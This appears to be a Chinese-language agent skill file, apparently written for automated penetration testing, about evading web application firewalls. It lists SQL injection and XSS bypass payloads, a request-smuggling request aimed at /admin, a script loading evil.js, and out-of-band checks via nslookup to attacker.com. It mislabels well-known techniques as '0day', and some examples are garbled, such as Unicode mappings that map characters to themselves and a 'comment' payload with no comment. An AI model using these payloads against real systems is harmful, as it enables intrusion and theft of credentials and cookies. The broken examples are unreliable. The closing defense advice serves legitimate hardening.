---
name: web-waf-bypass-0day
description: "WAF (Web Application Firewall) 绕过技术用于在目标系统部署了 WAF 防护时，通过编码变换、协议层差异、规则盲区、混淆技术等手段绕过关键字检测和模式匹配规则 适用于: 目标使用最新版本的 Cloudflare/阿里云 WAF/ModSecurity，存在未公开的绕过技术; WAF 对 SQL 注入关键字（UNION SELECT、OR 1=1）进行检测，需要绕过; WAF 对 XSS payload（<script>、onerror=）进行拦截，需要编码绕过"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - waf
  - bypass
  - 0day
  - firewall
  - evasion
  - filter-bypass
  category: web
  risk-level: high
  confidence: 0.89
---
# Web WAF Bypass 0day
WAF (Web Application Firewall) 绕过技术用于在目标系统部署了 WAF 防护时，通过编码变换、协议层差异、规则盲区、混淆技术等手段绕过关键字检测和模式匹配规则。WAF 的核心工作原理是基于规则的特征匹配（正则表达式、关键字检测、异常评分），而绕过技术的本质是找到 WAF 规则与后端应用解析之间的差异——即 WAF 认为安全的输入，被后端应用解析为恶意 payload。常见的 WAF 绕过类别包括：编码绕过（URL 编码、双重编码、Unicode 编码、Base64、HTML 实体编码）、协议层绕过（HTTP/2 分块传输、请求走私、Content-Type 混淆、multipart 边界操纵）、规则盲区绕过（利用 WAF 不检查的 HTTP 头、非标准端口、特定请求方法）、逻辑绕过（利用注释、空白符、大小写混合、换行符分割关键字）、以及针对特定 WAF 产品的 0day 绕过（如 Cloudflare 的特定解析差异、ModSecurity 的规则遗漏）。
## 何时使用

### 触发场景

- 目标使用最新版本的 Cloudflare/阿里云 WAF/ModSecurity，存在未公开的绕过技术
- WAF 对 SQL 注入关键字（UNION SELECT、OR 1=1）进行检测，需要绕过
- WAF 对 XSS payload（<script>、onerror=）进行拦截，需要编码绕过
- WAF 对命令注入关键字（|、;、$()、``）进行检测
- WAF 实施了请求体大小限制、参数数量限制或特殊字符过滤

### 关键词

`waf绕过`, `waf bypass`, `firewall evasion`, `0day waf`, `payload obfuscation`, `encoding bypass`

### 识别指标

- 403 Forbidden
- blocked by WAF
- security firewall triggered

### 别名

`WAF 绕过 0day`, `waf 0day`, `firewall 0day`

## 操作检查清单

1. 识别 WAF 类型（Cloudflare、ModSecurity、AWS WAF、阿里云 WAF、Imperva 等）
2. 分析被拦截的 payload，精确定位被检测的关键字或模式
3. 尝试 URL 编码（单次、双重、三重）、Unicode 编码、HTML 实体编码
4. 尝试关键字分割：使用注释（/**/、--、#）、空白符（%09、%0a、+）、换行符
5. 尝试大小写混合：SeLeCt、UnIoN、ScRiPt
6. 尝试协议层绕过：HTTP/2、分块传输编码、multipart 边界操纵
7. 尝试 HTTP 头注入：将 payload 放在 X-Forwarded-For、Referer、User-Agent 等头中
8. 尝试请求走私：利用 Content-Length 与 Transfer-Encoding 的解析差异
9. 尝试 WAF 不检查的位置：Cookie 值、JSON 字段、XML 属性、GraphQL 查询
10. 验证绕过后的 payload 是否真正到达后端（使用 DNS 外带或时间延迟确认）

## 技术手段

- URL 编码绕过：%27 (单引号)、%3C (小于号)、%53%45%4C%45%43%54 (SELECT)
- 双重/三重 URL 编码：%2527 → %27 → '，WAF 可能只解码一次
- Unicode 编码：' → '，< → <，WAF 可能不检查 Unicode 变体
- HTML 实体编码：< → &lt; 或 &#60; 或 &#x3C;，后端可能自动解码
- SQL 注释绕过：UN/**/ION SEL/**/ECT、UNI/*foo*/ON SEL/*bar*/ECT
- 空白符绕过：SELECT 替换为 SEL%09ECT 或 SEL%0aECT 或 SEL+ECT
- 大小写混合：SELECT → SeLeCt、UNION → UnIoN、script → ScRiPt
- 分块传输编码：Transfer-Encoding: chunked，绕过基于请求体的 WAF 检测
- HTTP/2 协议绕过：HTTP/2 请求在某些 WAF 中解析不完整
- 请求走私：CL.TE / TE.CL 绕过，利用前端 WAF 与后端服务器的解析差异
- Content-Type 混淆：application/json 改为 text/plain 或 multipart/form-data
- 参数污染：id=1&id=2，WAF 检查第一个参数，后端使用第二个参数

## 实战经验

### 症状

- 常规 SQL 注入 payload（UNION SELECT、OR 1=1）被 403 拦截，但 URL 编码后的 payload 可以到达后端
- <script> 标签被 WAF 拦截，但使用 <svg onload=> 或 <img onerror=> 可以绕过
- 命令注入关键字（|、;、$()）被过滤，但使用 %0a（换行符）或 %09（制表符）可以绕过
- WAF 拦截包含 SELECT 关键字的请求，但使用 SEL/**/ECT 或 SelEcT 大小写混合可以绕过
- 文件上传时 .php 扩展名被拦截，但 .php5、.phtml、.Php 或使用双扩展名可以绕过
- 请求体中的 SQL 关键字被检测，但将 payload 放在不常见的 HTTP 头中可以绕过

### 根因分析

- WAF 使用正则表达式匹配关键字，但未覆盖所有编码变体和解析差异
- WAF 在 HTTP 请求解析层与应用层使用不同的解析器，导致解析结果不一致
- WAF 规则基于黑名单（拦截已知恶意模式），而非白名单（只允许已知安全模式），存在遗漏
- WAF 对某些 HTTP 特性支持不完整（如 HTTP/2、分块传输、multipart/form-data 边界），导致检测遗漏
- WAF 性能优化导致只检查请求的前 N 个字节或前 M 个参数，超出部分未被检测
- WAF 与后端应用使用的 URL 解码器不同，WAF 可能不解码或解码方式不一致
- WAF 配置过于宽松（仅启用基础规则集），未启用高级检测规则或自定义规则
- WAF 部署在 CDN/反向代理层，源站未部署 WAF，可通过直接访问源站绕过

### 实战观察

- Cloudflare WAF 对 HTTP/2 请求的解析与 HTTP/1.1 存在差异，某些 payload 在 HTTP/2 下不被检测
- ModSecurity CRS (Core Rule Set) 的规则编号已知，可以针对性地构造绕过特定规则的 payload
- AWS WAF 对请求体的检查有大小限制（默认 8KB），超过限制的部分不被检测
- 阿里云 WAF 对中文编码（GBK、GB2312）的处理可能存在差异，可用于绕过关键字检测
- WAF 通常不检查 Cookie 值中的某些特殊字符，但后端应用可能正常解析
- 分块传输编码 (chunked encoding) 可以绕过基于请求体大小和内容检测的 WAF 规则
- HTTP 请求走私 (HTTP Request Smuggling) 利用前端 WAF 与后端服务器对 Content-Length/Transfer-Encoding 的解析差异

### 常见错误

- 只尝试单一的绕过技术（如仅 URL 编码），而实际上需要组合多种技术
- 未确认 WAF 的具体类型和版本，盲目尝试通用绕过方法
- 忽略了 WAF 可能只检查特定位置（如 URL 参数），而忽略了 POST body、Cookie、HTTP 头的绕过可能
- 使用过于复杂的绕过 payload，导致后端应用也无法正确解析
- 未验证绕过后的 payload 是否真正到达后端（可能 WAF 静默丢弃而非返回 403）
- 忽略了 WAF 的行为模式分析——通过逐步简化 payload 可以精确定位被检测的关键字
- 未考虑 WAF 的速率限制和 IP 封禁机制，大量测试可能触发 IP 封禁

### 补充说明

- WAF 绕过测试应使用 Burp Suite 的 Intruder 模块自动化编码变换和模糊测试
- 识别 WAF 类型的方法：查看 403 响应头（Server、X-Powered-By）、错误页面样式、行为特征
- Cloudflare 特征：响应头包含 cf-ray、cf-cache-status；错误页面显示 "Attention Required"
- ModSecurity 特征：403 响应中包含 "ModSecurity" 或 "Rule ID" 信息
- WAF 绕过技术应按优先级尝试：编码绕过 > 注释绕过 > 大小写混合 > 协议层差异 > HTTP 头注入
- SQLi WAF 绕过可参考 sqlmap 的 tamper 脚本

## 示例

### SQL 注入 WAF 绕过 (Cloudflare)

使用多种编码和混淆技术绕过 Cloudflare WAF 的 SQL 注入检测

```
原始 payload (被拦截): UNION SELECT username,password FROM users--

绕过 1 - URL 编码 + 注释: %20UNION%20SEL%2F%2FECT%20username%2Cpassword

绕过 2 - 双重 URL 编码: %2520UNION%2520SELECT%2520username%252Cpassword

绕过 3 - 内联注释 + 大小写: %20UnIoN%20SeLeCt%201,2,3--

绕过 4 - HPP (HTTP 参数污染): id=1&id=UNION+SELECT+username,password+FROM+users--

绕过 5 - JSON body 绕过 (如果 WAF 不检查 POST JSON)
```

**适用场景:**
- Cloudflare 保护的网站
- SQL 注入点被 WAF 拦截
- API 端点 SQL 注入

### HTTP 请求走私绕过 WAF

利用前端 WAF 与后端服务器对 HTTP 请求的解析差异，绕过 WAF 检测

```
CL.TE 走私 (Content-Length > Transfer-Encoding):
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1


原理: WAF 按 Content-Length: 13 读取请求，后端按 Transfer-Encoding: chunked 处理
     结果: 攻击者的 GET /admin 请求绕过了 WAF 检测

防御: WAF 和后端服务器应一致处理 Content-Length 和 Transfer-Encoding
```

**适用场景:**
- 反向代理后的 WAF
- CDN + 源站架构
- 多层代理环境

### XSS WAF 绕过技术

使用 HTML 解析差异、事件处理器变体、CSP 策略缺陷绕过 WAF 的 XSS 过滤

```
原始 payload (被拦截): <script>alert(document.cookie)</script>

绕过 1 - SVG 标签: <svg onload=alert(1)>
绕过 2 - img 标签 onerror: <img src=x onerror=alert(1)>
绕过 3 - 编码绕过: <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
绕过 4 - 事件处理器变体: <details ontoggle=alert(1) open>
绕过 5 - 大小写 + 空白符: <ScRiPt>alert(1)</ScRiPt>
绕过 6 - 利用 CSP 策略缺陷: <script src=https://allowed-cdn.com/evil.js></script>
```

**适用场景:**
- XSS 过滤 WAF
- CSP 策略绕过
- 富文本编辑器 XSS

## 验证标准

### 验证指标

- WAF 返回 403 但修改编码/混淆后返回 200/401/500（说明请求到达了后端）
- 使用 DNS 外带（nslookup attacker.com）确认命令注入 payload 被执行
- 时间延迟（sleep 5）确认 SQL 注入或命令注入 payload 到达后端
- WAF 拦截了特定关键字，但使用编码/注释/大小写后未被拦截
- HTTP 走私成功：后续请求绕过了 WAF 直接到达后端

### 成功标志

- 绕过 WAF 后，原有的攻击 payload 正常执行（SQL 查询返回数据、XSS 弹窗、命令执行成功）
- WAF 的 403 响应变为后端的业务响应（200、401、500 等）
- DNS 外带确认了命令执行
- 时间延迟确认了 SQL 注入或命令注入
- 文件上传成功且上传的文件可被服务端执行

### 误报标志

- WAF 未返回 403 但 payload 被静默修改或丢弃（需验证后端是否真正执行）
- 编码后的请求到达后端但后端也使用了相同的编码，导致 payload 未正确解析
- WAF 返回 200 但实际上是自定义错误页面而非真正的成功响应
- HTTP 走私尝试未改变后端行为，说明不存在解析差异
- 文件上传成功但上传的文件存储在不可执行目录

## 防御建议

### 推荐做法

- 使用白名单而非黑名单：只允许已知安全的输入模式，拒绝所有其他输入
- WAF 与后端应用使用相同的解析器和编码处理方式
- 对所有 HTTP 请求统一进行 URL 解码、Unicode 解码后再进行规则匹配
- 启用 WAF 的虚拟补丁功能，针对已知漏洞快速部署防护规则
- WAF 应检查所有请求位置：URL 参数、POST body、Cookie、HTTP 头、文件上传
- 对请求体实施完整检测，不限制检测大小或位置
- 统一前端 WAF 与后端服务器对 Content-Length 和 Transfer-Encoding 的处理
- 定期更新 WAF 规则集，关注新型绕过技术的防护规则
- 实施纵深防御：WAF + 应用层输入验证 + 参数化查询 + 输出编码

### 缓解措施

- 部署多层 WAF（CDN 层 + 应用层），增加绕过难度
- 使用行为分析检测异常请求模式（如大量编码变换、非常规参数组合）
- 实施请求签名验证，确保请求在传输过程中未被篡改
- 对文件上传实施严格的内容验证和存储隔离

## 参考链接

- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Test_WAF_Bypass
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- https://www.imperva.com/learn/application-security/waf-bypass-techniques/
- https://portswigger.net/research/http-desync-attacks-what-happened-next
